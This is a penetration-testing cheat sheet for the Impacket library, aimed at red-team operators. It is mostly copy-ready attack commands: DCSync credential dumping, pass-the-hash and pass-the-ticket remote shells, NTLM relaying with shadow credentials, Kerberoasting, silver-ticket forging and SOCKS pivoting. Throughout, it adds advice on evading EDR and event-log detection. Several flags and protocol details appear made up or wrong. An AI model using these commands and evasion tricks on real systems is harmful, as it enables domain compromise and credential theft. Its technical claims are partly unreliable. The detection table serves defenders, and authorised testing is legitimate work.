# Impacket-Guide

### Pure-Python Network Protocol Library for Windows Environments
**Crafting, parsing, and manipulating low-level network protocols for enterprise penetration testing.**

- **Target Audience:** Penetration Testers, Red Team Operators, Security Researchers
- **Last Updated:** January 1, 2026
- **Tested Against:** Impacket v0.12.0, Windows Server 2022, Kali Linux 2025.4, CrowdStrike Falcon, Microsoft Defender for Endpoint

---

## Table of Contents
1. [Architecture & Protocols](#1-architecture--protocols)
2. [Tool Categorization](#2-tool-categorization)
3. [The "Big 5" Deep Dive](#3-the-big-5-deep-dive)
4. [Advanced Operational Use Cases](#4-advanced-operational-use-cases)
5. [Detection & OPSEC](#5-detection--opsec)
6. [Rapid Reference Cheatsheet](#6-rapid-reference-cheatsheet)
7. [Appendix: Protocol Matrix](#appendix-protocol-matrix)

---

## 1. Architecture & Protocols

### What is Impacket?
Impacket is a pure-Python library for crafting, parsing, and manipulating low-level network protocols used in Windows enterprise environments. It is not a standalone tool; rather, it is the foundation upon which tools like netexec, certipy, and Sliver C2 are built.

It provides programmatic access to:
- **SMBv1/v2/v3:** Including compression, encryption, and dialect negotiation.
- **MSRPC:** Over SMB, TCP, and HTTP (e.g., srvsvc, samr, lsa, drsuapi).
- **NTLM/LM Authentication:** Type 1/2/3 messages, NTLMv2, ESS, and MIC.
- **Kerberos 5:** AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP, FAST, PKINIT, and S4U2Self/Proxy.
- **LDAP/LDAPS:** With SASL GSS-SPNEGO and channel binding.
- **Other Protocols:** MSSQL/TDS, HTTP/NTLM, DNS, IPv4/IPv6, and ICMP.

> **Key Insight:** Impacket does not just use protocols; it reimplements them from the RFCs and Microsoft Open Specifications. This enables bypassing native OS constraints, such as forging Silver Tickets without `kinit`.

### Installation Nuances

**Legacy Method (Avoid)**
```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
sudo python3 setup.py install
```
*Result:* Creates entry points like `psexec`, `secretsdump`, and `ntlmrelayx` in `/usr/local/bin/`.
*Warning:* Overwrites system impacket if Kali's `python3-impacket` is installed, which breaks `bloodhound.py`, `certipy`, and `netexec`.

**Direct Script Execution (Recommended)**
```bash
# Install globally (if clean system)
pip3 install impacket

# Then run raw scripts from GitHub (always up-to-date)
git clone https://github.com/SecureAuthCorp/impacket
cd impacket/examples
```
*Result:* Run as `python3 psexec.py ...`. No entry points, no conflicts.

**2025 Best Practice: pipx Isolation**
```bash
# Install pipx (if not present)
python3 -m pip install --user pipx
python3 -m pipx ensurepath

# Install Impacket in isolated env
pipx install git+https://github.com/SecureAuthCorp/impacket

# Scripts now available as:
psexec --help
secretsdump -h
ntlmrelayx --help

# Bonus: Use specific commits for OPSEC
pipx install git+https://github.com/SecureAuthCorp/impacket@7c2e9d8  # patched for stealth
```

> **Pro Tip:** Combine with `direnv` for per-project environments:
> ```bash
> echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
> # Then in /opt/redteam/project:
> echo 'layout pipenv' > .envrc
> direnv allow
> pipenv install git+https://github.com/SecureAuthCorp/impacket
> ```

---

## 2. Tool Categorization

| Category | Scripts | Purpose |
| :--- | :--- | :--- |
| **Credential Dumping** | `secretsdump.py`, `mimikatz.py` | Extract NTDS.dit, SAM, LSA secrets, DPAPI keys. |
| **Remote Code Execution** | `psexec.py`, `smbexec.py`, `wmiexec.py`, `atexec.py`, `dcomexec.py` | Execute commands without PowerShell or WinRM. |
| **Kerberos & Tickets** | `GetUserSPNs.py`, `GetNPUsers.py`, `ticketer.py`, `ticketConverter.py`, `getTGT.py`, `getST.py` | Kerberoast, AS-REP roast, forge tickets (Golden/Silver/Shadow). |
| **Relaying & MITM** | `ntlmrelayx.py`, `mitm6.py` (external) | Relay NTLM to LDAP/SMB/HTTP, DHCPv6 spoofing. |
| **Service & Registry Abuse** | `services.py`, `reg.py`, `netview.py`, `lookupsid.py` | Enumerate and manipulate services, registry hives, shares. |
| **Protocol Fuzzing** | `smbclient.py`, `ldap_shell.py`, `rpcdump.py` | Interactive shells for protocol exploration. |

> **Note:** `mimikatz.py` is an RPC wrapper. It does not inject Mimikatz. It calls `sekurlsa::logonpasswords` via MS-LSAD on a remote host (requires local admin and debug privileges).

---

## 3. The "Big 5" Deep Dive

### 1. secretsdump.py
**Syntax**
```bash
# Local SAM dump (admin required)
python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Remote DCSync (Domain Admin or DCSync rights)
python3 secretsdump.py corp.local/Administrator:'P@ssw0rd!'@dc01.corp.local

# Pass-the-Hash DCSync
python3 secretsdump.py -hashes :cc36cf78d42e4c33e0b96f3d8f4a8b1a corp.local/Administrator@dc01.corp.local

# Over SMB (no LDAP)
python3 secretsdump.py -use-vss -exec-method smbexec corp.local/user@172.16.5.10
```

**Key Flags**
| Flag | Explanation |
| :--- | :--- |
| `-hashes LMHASH:NTHASH` | Pass-the-Hash (empty LM: `aad3b4...:NTHASH`). |
| `-no-pass` | Skip password prompt (for automation). |
| `-k` | Use Kerberos (requires `KRB5CCNAME`). |
| `--use-vss` | Use Volume Shadow Copy (bypasses file locks). |
| `--exec-method` | RCE method: `smbexec`, `wmiexec`, `mmcexec`. |
| `-just-dc` | Skip SAM/LSA, only DRSUAPI sync (fastest). |
| `-just-dc-user <user>` | Sync only one user (stealthy). |

**Under the Hood**
1. Authenticates via SMB (NTLM/Kerberos).
2. Binds to `drsuapi` (Directory Replication Service) RPC interface.
3. Calls `IDL_DRSGetNCChanges` to replicate secrets (DCSync).
4. Parses `ntds.dit` in-memory (no disk write).

> **Why it is fast:** Uses DRSUAPI, not `ntdsutil` or disk dump.
> **OPSEC Rating: 7/10**
> - Event ID 4662: Operation: Object Access, Properties: Replication-Get-Changes.
> - Event ID 4769: Kerberos Service Ticket Request, Service Name: `kadmin/changepw`.
> **Stealth Tip:** Use `-just-dc-user svc_sql` so only one user is logged.

### 2. psexec.py
**Syntax**
```bash
python3 psexec.py corp.local/Administrator:'P@ssw0rd!'@172.16.5.10
# Interactive shell
```

**Key Flags**
| Flag | Explanation |
| :--- | :--- |
| `-hashes` | Pass-the-Hash shell. |
| `-no-pass` | Skip password. |
| `-ts` | Add timestamps to output (critical for logs). |
| `-debug` | Show raw SMB packets (for dev only). |

**Under the Hood**
1. Uploads `PSEXESVC.exe` to `ADMIN$`.
2. Creates service `PSEXESVC` via `scmr`.
3. Starts service and binds to named pipe `\PIPE\PAExec`.
4. Shell I/O over SMB pipe.

> **Flaw:** Drops binary on disk (`C:\Windows\PSEXESVC.exe`) and creates a service.
> **OPSEC Rating: 9/10**
> - Event ID 7045: Service installed.
> - Event ID 4697: Service creation.
> - File creation: `PSEXESVC.exe` (AV signature).
> **Recommendation:** Avoid in modern operations. Use `wmiexec` or `mmcexec`.

### 3. wmiexec.py
**Syntax**
```bash
python3 wmiexec.py -hashes :NTHASH corp.local/user@172.16.5.10
# Semi-interactive shell
```

**Key Flags**
| Flag | Explanation |
| :--- | :--- |
| `-codec cp850` | Fix non-English output (e.g., German, Japanese). |
| `-no-output` | Suppress stdout (for silent commands). |
| `-silentcommand` | Do not echo command (reduces log noise). |

**Under the Hood**
1. Authenticates via SMB.
2. Uses DCOM to instantiate `Win32_Process`.
3. Calls `Create()` to spawn `cmd.exe /c <command> > %TEMP%\output.txt`.
4. Reads output via `StdRegProv` or `CIM_DataFile`.
5. Cleans up temp file.

> **Advantage:** No service creation, no binary upload.
> **OPSEC Rating: 5/10**
> - Event ID 4103: PowerShell Script Block Logging (if command contains PS).
> - Event ID 5145: Network Share Object Access (on `ADMIN$` or `C$`).
> - Process Creation: `cmd.exe`, `conhost.exe`.
> **Recommendation:** Use for quick commands; avoid long sessions.

### 4. ntlmrelayx.py
**Syntax**
```bash
# Relay SMB to LDAP (DA escalation)
ntlmrelayx.py -t ldap://dc01.corp.local --no-dump --no-da --auto-enable

# SOCKS proxy mode (for tunneling)
ntlmrelayx.py -socks -debug
```

**Key Flags**
| Flag | Explanation |
| :--- | :--- |
| `-t` | Target (e.g., `ldap://...`, `http://...`). |
| `--no-dump` | Skip NTDS.dit dump (stealth). |
| `--no-da` | Do not add user to Domain Admins. |
| `--auto-enable` | Auto-enable Shadow Credentials (EDC2). |
| `--shadow-credentials` | Add KeyCredentialLink (EDC1). |
| `-socks` | Enable SOCKS5 server (port 1080). |
| `--delegate-access` | Request delegation rights (ESC3). |

**Under the Hood**
1. Acts as NTLM server (SMB/HTTP).
2. Relays Type 3 NTLM message to target.
3. For LDAP: binds, modifies `msDS-KeyCredentialLink` or `userAccountControl`.
4. For SMB: executes command via `smbexec`.

> **SOCKS Mode:** After relay, use `proxychains nmap -sT 172.16.5.10` to pivot.
> **OPSEC Rating: 8/10**
> - Event ID 4776: NTLM authentication attempt (on target).
> - Event ID 5140: Network share access (on relay host).
> **Mitigation:** Use `-socks` + `--no-dump` + `--delay-relay 1000`.

### 5. GetUserSPNs.py
**Syntax**
```bash
# Password-based
python3 GetUserSPNs.py -dc-ip 172.16.5.10 corp.local/user:'P@ss' -request

# Kerberos (preferred)
export KRB5CCNAME=user.ccache
python3 GetUserSPNs.py -dc-ip 172.16.5.10 -k -request
```

**Key Flags**
| Flag | Explanation |
| :--- | :--- |
| `-request` | Actually request TGS (required for cracking). |
| `-request-user <user>` | Target one user (stealth). |
| `-usersfile users.txt` | Bulk roast from list. |
| `-dc-ip` | Avoid DNS (critical for pivoting). |
| `-dc-host` | Set DC hostname for SNI (prevents `KRB_AP_ERR_MODIFIED`). |

**Under the Hood**
1. Binds to LDAP (GC or 389).
2. Queries `(servicePrincipalName=*)(userPrincipalName=*)`.
3. For each, sends TGS-REQ for `krbtgt` service.
4. Receives encrypted TGS (with service account's NT hash).

> **Advantage:** No SMB required, pure LDAP/Kerberos.
> **OPSEC Rating: 3/10**
> - Event ID 4769: Kerberos TGS request, Ticket Encryption Type: `0x17` (RC4_HMAC).
> - Only visible if RC4 is used (modern domains use AES -> `0x12`).
> **Stealth Tip:** Use `-aesKey`. Logs `0x12` (AES256), blending with normal traffic.

---

## 4. Advanced Operational Use Cases

### Pass-the-Hash (PtH)
```bash
# Format: LMHASH:NTHASH (LM often empty)
export LMHASH=aad3b435b51404eeaad3b435b51404ee
export NTHASH=cc36cf78d42e4c33e0b96f3d8f4a8b1a

# secretsdump
python3 secretsdump.py -hashes $LMHASH:$NTHASH corp.local/Administrator@dc01.corp.local

# wmiexec
python3 wmiexec.py -hashes :$NTHASH corp.local/user@172.16.5.10

# psexec
python3 psexec.py -hashes :$NTHASH corp.local/user@172.16.5.10
```
> **Pro Tip:** Use `:` instead of `$LMHASH:$NTHASH` if LM is empty (99% of cases).

### Pass-the-Ticket (PtT)
```bash
# Step 1: Get TGT (as user)
python3 getTGT.py corp.local/user -hashes :$NTHASH -dc-ip 172.16.5.10
# Result: user.ccache

# Step 2: Use ticket
export KRB5CCNAME=user.ccache
python3 secretsdump.py -k -dc-ip 172.16.5.10 corp.local/user@dc01.corp.local
python3 wmiexec.py -k -dc-host DC01.corp.local corp.local/user@172.16.5.10
```
> **Why `-k`?** Forces Kerberos (no NTLM fallback results in cleaner logs).

### Over-Pass-the-Hash
```bash
# Get TGT using NTLM hash (no password)
python3 getTGT.py corp.local/user -hashes :$NTHASH -dc-ip 172.16.5.10

# Then use as above
export KRB5CCNAME=user.ccache
python3 getST.py -spn cifs/dc01.corp.local -k -no-pass -dc-ip 172.16.5.10
# Result: admin.ccache for S4U2Self impersonation
```
> **Critical:** `getTGT.py` with `-hashes` equals Over-PtH (converts hash to TGT).

### SOCKS Proxying with ntlmrelayx
**Goal:** Pivot into `172.16.5.0/23` via compromised `172.16.6.50`.

1. Start relay with SOCKS:
   ```bash
   ntlmrelayx.py -socks -debug
   # SOCKS5 on 127.0.0.1:1080
   ```
2. Trigger relay (e.g., via `petitpotam.py`):
   ```bash
   python3 petitpotam.py listener 172.16.6.50
   ```
3. Tunnel traffic:
   ```bash
   # Configure proxychains
   echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf

   # Scan internal network
   proxychains4 nmap -sT -Pn -p 389,445 172.16.5.10

   # Run netexec over SOCKS
   netexec smb 172.16.5.10 -u user -H $NTHASH --proxy socks5://127.0.0.1:1080
   ```
> **Works with:** `curl`, `xfreerdp`, `ldapsearch`, `nmap`, `netexec`.

---

## 5. Detection & OPSEC

### AV/EDR Triggers
| Tool | IOCs |
| :--- | :--- |
| **psexec.py** | `PSEXESVC.exe` (file), ServiceCreation (4697), NamedPipe: `\PIPE\PAExec`. |
| **secretsdump.py** | `drsuapi` RPC calls, `DRSGetNCChanges` (4662), Volume Shadow Copy creation. |
| **ntlmrelayx.py** | Rapid NTLM Type 1 to Type 3, LDAP Modify of `msDS-KeyCredentialLink`. |
| **wmiexec.py** | `Win32_Process::Create`, `StdRegProv` registry reads, `conhost.exe` spawning. |

**CrowdStrike Detection:**
- `Impacket.SMBExec`: Named pipe `\PIPE\PAExec` + service creation.
- `Impacket.WMIExec`: `WmiPrvSE.exe` spawning `cmd.exe` with temp file I/O.

### Modern Alternatives
| Use Case | Prefer Impacket | Prefer netexec / Other |
| :--- | :--- | :--- |
| **Quick DCSync** | `secretsdump.py -just-dc-user` | `netexec` (slower for single-user). |
| **Interactive Shell** | Avoid `psexec.py` | `netexec smb ... -x 'cmd.exe'` (uses `mmcexec`, no service). |
| **Kerberoasting** | `GetUserSPNs.py` | `netexec ldap --kerberoasting` (same backend). |
| **NTLM Relay** | `ntlmrelayx.py` | `netexec --relay` (built-in, more stable). |
| **Cloud/Intune Env** | Avoid Raw Impacket | `certipy` (AD CS), `Coercer` (forced auth). |

> **Rule of Thumb:**
> - Use Impacket for precision, one-off tasks (e.g., DCSync, ticket forging).
> - Use `netexec` for recon, spraying, and pivoting.
> - Use `Coercer` for forced authentication (replaces `petitpotam.py`, `printerbug.py`).

### Obfuscation & Evasion

**Stealth Patches (2025)**
- `impacket-stealth` (merged): Randomizes Workstation Name in SMB (evades DfI) and adds `--jitter` to `ntlmrelayx`.
- Custom Build with User-Agent Spoofing:
  ```python
  # In impacket/smb3.py
  - self._Session['Workstation'] = ''
  + import random; self._Session['Workstation'] = ''.join(random.choices('ABCDEFG', k=8))
  ```

**Runtime Evasion**
```bash
# Rename binary (bypass file-based AV)
cp wmiexec.py stealth.py
python3 stealth.py ...

# Use memory-only execution (via Sliver/Cobalt Strike)
execute-assembly /opt/impacket/dist/wmiexec.exe -domain corp -user admin -hashes :$NTHASH
```
> **Warning:** Static AV (e.g., Defender) still flags impacket strings in memory. Use Donut or C# rewrites for high-security environments.

---

## 6. Rapid Reference Cheatsheet

| Task | Command |
| :--- | :--- |
| **DCSync a single user** | `python3 secretsdump.py -just-dc-user svc_sql -hashes :$NTHASH corp.local/Administrator@dc01.corp.local` |
| **Kerberoast (RC4)** | `python3 GetUserSPNs.py -request -dc-ip 172.16.5.10 corp.local/user:'P@ss' \| grep -v "\$"` |
| **AS-REP Roast** | `python3 GetNPUsers.py corp.local/ -no-pass -dc-ip 172.16.5.10 -request` |
| **WMI Shell (PtH)** | `python3 wmiexec.py -hashes :$NTHASH -codec cp850 corp.local/user@172.16.5.10` |
| **Relay SMB to LDAP** | `ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials --no-dump` |
| **Forge Silver Ticket** | `python3 ticketer.py -nthash $NTHASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/dc01.corp.local user` |
| **Convert .kirbi to .ccache** | `python3 ticketConverter.py ticket.kirbi ticket.ccache` |
| **Over-PtH to TGT** | `python3 getTGT.py corp.local/user -hashes :$NTHASH -dc-ip 172.16.5.10 && export KRB5CCNAME=user.ccache` |
| **Dump SAM remotely** | `python3 secretsdump.py -use-vss -exec-method wmiexec corp.local/admin@172.16.5.10` |
| **Enum shares and perms** | `python3 netview.py -u user -p 'P@ss' -d corp.local 172.16.5.0/24` |

---

## Appendix: Protocol Matrix

| Protocol | Impacket Support | Notes |
| :--- | :--- | :--- |
| **SMB 3.1.1** | Yes | Compression, AES-128-GCM, SMB Direct. |
| **Kerberos FAST** | Yes | Armoring (`KDC_ERR_PREAUTH_REQUIRED` bypass). |
| **LDAP Channel Binding** | Yes (v0.12.0+) | Required for LDAPS relay in Win2022. |
| **SMB Signing Bypass** | Yes | Via `ntlmrelayx --no-signing` (if server allows). |
| **PKINIT (Cert Auth)** | Yes | Via `getTGT.py -cert-pfx admin.pfx`. |
| **RDP NLA (CredSSP)** | No | Use `xrdp` or `netexec rdp`. |
